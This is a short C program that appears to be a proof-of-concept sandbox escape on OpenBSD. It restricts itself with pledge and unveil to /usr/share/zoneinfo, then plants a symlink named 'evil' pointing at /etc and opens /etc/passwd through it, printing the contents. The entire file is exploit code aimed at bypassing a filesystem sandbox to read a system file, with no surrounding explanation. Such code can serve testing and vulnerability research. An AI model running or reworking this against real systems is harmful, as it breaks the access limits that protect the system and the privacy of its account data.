#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>

int main(void)
{
    int fd;
    ssize_t bytes_read;
    char buffer[8192];

    /* Set up sandbox */
    printf("pledge\n");
    if (pledge("stdio rpath unveil cpath", NULL) == -1) {
        perror("pledge");
        return 1;
    }
    
    printf("unveil\n");
    if (unveil("/usr/share/zoneinfo", "rwc") == -1) {
        perror("unveil");
        return 1;
    }

    printf("lock\n");
    /* Lock unveil - no more changes allowed */
    unveil(NULL, NULL);

    printf("symlink\n");
    /* Create symlink to /etc through the "safe" directory */
    if (symlink("/etc", "/usr/share/zoneinfo/evil") == -1) {
        perror("symlink");
    }

    /*
     * Call __pledge_open with path that looks like it's in the allowed
     * directory but actually follows symlink to /etc
     */
    printf("open\n");
    fd = open("/usr/share/zoneinfo/evil/passwd", O_RDONLY, 0);
    if (fd == -1) {
        perror("__pledge_open");
        return 1;
    }

    /* Read and display file contents */
    bytes_read = read(fd, buffer, sizeof(buffer) - 1);
    if (bytes_read > 0) {
        buffer[bytes_read] = '\0';
        printf("%s", buffer);
    }

    close(fd);
    return 0;
}
